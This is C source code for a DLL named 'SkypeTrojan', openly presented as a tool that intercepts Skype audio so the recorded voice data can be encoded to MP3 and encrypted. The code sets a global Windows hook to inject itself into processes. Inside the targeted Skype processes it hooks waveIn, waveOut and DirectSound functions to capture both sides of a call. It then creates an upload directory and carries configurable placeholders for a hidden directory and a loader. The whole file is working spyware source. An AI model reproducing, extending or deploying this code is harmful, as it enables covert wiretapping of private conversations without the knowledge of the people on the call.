/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */



/*
 * Tool name   : SkypeTrojan
 * Description : Tool to intercept Skype API calls and to extract voice data.
 *               The extracted data will be converted to MP3 and encrypted.
 * Version     : 
 * Author      : Ruben Unteregger
 * Web page    : http://www.megapanzer.com
 * Todo        : 
 * Changes     : 
 *
 */






#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <winsock.h>
#include <sys/stat.h>
#include <MMREG.H>
#include <Msacm.h>
#include <Shlwapi.h>

#include "HijackEng/Hooking.h"
#include "VoIP_Recorder.h"
#include "BladeMP3EncDLL.h"
#include "Skype_2_Functions.h"
#include "Skype_3_Functions.h"


#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "netapi32.lib")


char gProcName[MAX_BUF_SIZE + 1];
char gInAudioBlocksBuffer[MAX_AUDIO_SIZE];
char gOutAudioBlocksBuffer[MAX_AUDIO_SIZE];

HINSTANCE gLameDLL = NULL;
HANDLE hHook = 0;


byte* CG_waveInOpen;
byte* CG_waveInClose;
byte* CG_waveOutWrite;
byte* CG_waveOutOpen;
byte* CG_waveOutClose;
byte* CG_directSoundCreate;
byte* CG_directSoundCaptureCreate;


BEINITSTREAM gBeInitStream = NULL;
BEENCODECHUNK gBeEncodeChunk = NULL;
BEDEINITSTREAM gBeDeinitStream = NULL;
BECLOSESTREAM gBeCloseStream = NULL;




char gInTimeStamp[MAX_BUF_SIZE + 1];
char gOutTimeStamp[MAX_BUF_SIZE + 1];

int gOutAudioBlocksBufferSize;
int gInAudioBlocksBufferSize;

DWORD gBlockCounterInput; 
DWORD gBlockCounterOutput;

bool gInputIsRecording = false;
bool gOutputIsRecording = false;
bool gOutputGotData = false;
bool gInputGotData = false;



int gVoIPVersionApplication = SKYPE_2;

char *gHiddenDirectory = "_DIREC\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
char *gLIID = "_LIID\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
char *gLoaderName = "_LOADER\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
char *gDLLName = "_LAME\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
char *gQuality = "_QUALITY\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
char gHomeDirectory[MAX_BUF_SIZE + 1];



/*
 * For dll injection purpose only
 */


LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam) 
{
  return CallNextHookEx((HHOOK) hHook, nCode, wParam, lParam); 
}


void printDebug(char *pMsg)
{
  FILE *mFH = NULL;

  if (DEBUG && (mFH = fopen("c:\\debug2.txt", "a")) != NULL)
  {
    fprintf(mFH, "msg : \"%s\"\n", pMsg);
    fclose(mFH);
  }
}



/*
 * Load it and hijack it
 *
 */

BOOL APIENTRY DllMain(HINSTANCE hModule, DWORD  pLoadReason, LPVOID lpReserved)
{
FILE *mFH = NULL;
  HINSTANCE mDLLHandle = NULL;
  FARPROC pwaveInOpen;			// address of waveInOpen
  FARPROC pwaveInClose;			// address of waveInClose
  FARPROC pwaveOutOpen;			// address of waveOutOpen
  FARPROC pwaveOutClose;			// address of waveOutClose
  FARPROC pdirectSoundCreate;     // address of DirectSoundCreate
  FARPROC pdirectSoundCaptureCreate; // address of DirectSoundCaptureCreate

  HINSTANCE hWinmm;				// handle to Winmm.dll in memory
  HINSTANCE hDSound;				// handle to DSound.dll

  char mTemp[MAX_BUF_SIZE + 1];


  if(pLoadReason == DLL_PROCESS_ATTACH)
  {

    /*
     * Get Interface functions from the DLL and check its presence
     *
     */


    ZeroMemory(gProcName, sizeof(gProcName));
    GetModuleFileName(NULL, gProcName, MAX_BUF_SIZE);

    hWinmm = LoadLibrary("Winmm.dll");
    hDSound = LoadLibrary("DSound.dll");



    /*
     * if the process, which loaded this DLL, is the loader itself
     * set the global windows hook!
     */

    if(strstr(gProcName, gLoaderName))
    {
      hHook = SetWindowsHookEx(WH_CBT, HookProc, hModule, 0); 

      deleteAnyRecordingFlag(RECORDING_INPUT_SIGN_FILE, "LOADER");
      deleteAnyRecordingFlag(RECORDING_OUTPUT_SIGN_FILE, "LOADER");


      /*
       * If the process, which loaded this DLL, is skype, 
       * inject the proxy functions!
       *
       */
 
    } else if (strstr(gProcName, TARGET7) ||
               strstr(gProcName, TARGET8) ||
               strstr(gProcName, TARGET9)) {


      /*
       * Find home directory 
       *
       */

      ZeroMemory(gHomeDirectory, sizeof(gHomeDirectory));
      findBDHomeDirectory(gHomeDirectory, sizeof(gHomeDirectory) - 1);

      deleteAnyRecordingFlag(RECORDING_OUTPUT_SIGN_FILE, "TARGET FOUND");
      deleteAnyRecordingFlag(RECORDING_INPUT_SIGN_FILE, "TARGET FOUND");

      // set default skype version
      gVoIPVersionApplication = SKYPE_2;


      /*
       * create upload-directory
       *
       */

      ZeroMemory(mTemp, sizeof(mTemp));
      strncpy(mTemp, gHomeDirectory, sizeof(mTemp) - 1);


      if (mTemp[strlen(mTemp) - 1] != '\\')
        strcat(mTemp, "\\");

      strcat(mTemp, UPLOAD_DIRECTORY);


      if (!PathFileExists(mTemp))
        CreateDirectory(mTemp, NULL);



 

      /*
       * waveOuts
       *
       */

      if((pwaveOutClose = GetProcAddress(hWinmm, "waveOutClose")) != NULL)
        ForgeHook((DWORD)pwaveOutClose, (DWORD)MywaveOutClose, &CG_waveOutClose, "waveOutClose");

      if((pwaveOutOpen = GetProcAddress(hWinmm, "waveOutOpen")) != NULL)
        ForgeHook((DWORD)pwaveOutOpen, (DWORD)MywaveOutOpen, &CG_waveOutOpen, "waveoutopen");



      /*
       * WaveOuts
       *
       */

      if((pwaveInOpen = GetProcAddress(hWinmm, "waveInOpen")) != NULL)
        ForgeHook((DWORD)pwaveInOpen, (DWORD)MywaveInOpen, &CG_waveInOpen, "waveinopen");


      if((pwaveInClose = GetProcAddress(hWinmm, "waveInClose")) != NULL)
        ForgeHook((DWORD)pwaveInClose, (DWORD)MywaveInClose, &CG_waveInClose, "waveinclose");



      /*
       * DirectSound
       *
       */

      if((pdirectSoundCreate = GetProcAddress(hDSound, "DirectSoundCreate")) != NULL)
        ForgeHook((DWORD)pdirectSoundCreate, (DWORD) MyDirectSoundCreate, &CG_directSoundCreate, "DirectSoundCreate");

      if((pdirectSoundCaptureCreate = GetProcAddress(hDSound, "DirectSoundCaptureCreate")) != NULL)
        ForgeHook((DWORD)pdirectSoundCaptureCreate, (DWORD) MyDirectSoundCaptureCreate, &CG_directSoundCaptureCreate, "DirectSoundCaptureCreate");



      /*
       * Other stuff
       *
       */

      ZeroMemory(gInAudioBlocksBuffer, sizeof(gInAudioBlocksBuffer));
      ZeroMemory(gOutAudioBlocksBuffer, sizeof(gOutAudioBlocksBuffer));
    }
  } else if(pLoadReason == DLL_PROCESS_DETACH) {
  } else if(pLoadReason == DLL_THREAD_ATTACH) {
  } else if(pLoadReason == DLL_THREAD_DETACH) {
  }

  return(TRUE);
}
